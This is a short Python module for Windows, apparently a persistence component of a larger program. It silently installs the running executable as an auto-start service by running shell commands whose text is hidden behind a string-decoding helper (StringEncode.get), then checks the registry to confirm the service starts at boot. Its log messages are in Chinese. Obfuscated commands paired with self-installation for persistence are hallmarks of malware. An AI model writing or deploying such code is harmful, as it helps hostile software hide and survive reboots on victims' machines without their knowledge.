#coding:utf-8
import os
import sys
import StringEncode,ComMod
from random import randint
import winreg
class autorun:
    def __init__(self,install_path):
        self.app_name = sys.argv[0].split('\\')[-1].replace('.exe','')
        self.file_path = install_path + StringEncode.get('2')
        if self.check_service() == False:
            self.autorun()
    def autorun(self):
        ComMod.Log("AUTORUN：{}".format('开始创建服务'))
        scfile = str(randint(1,9999))
        os.system(StringEncode.get('16').format(scfile))
        os.system(StringEncode.get('17').format(scfile))
        os.system(StringEncode.get('18').format(scfile,self.app_name,sys.argv[0]))
        os.system(StringEncode.get('16').format(scfile))
        ComMod.Log("AUTORUN：{}".format('创建服务成功:'+self.app_name))

    def check_service(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\{}'.format(self.app_name))
            try:
                i = 0
                while 1:
                    name, value, type = winreg.EnumValue(key, i)
                    if name == 'Start' and str(value) == '2':
                        ComMod.Log("Autorun：检测启动服务正常")
                        winreg.CloseKey(key)
                        return True
                    i += 1
            except WindowsError as e:
                ComMod.Log("Autorun：检测启动服务不存在:"+str(e))
                return False
        except Exception as e:
            ComMod.Log("Autorun：检测启动服务不存在" + str(e) )
            return False
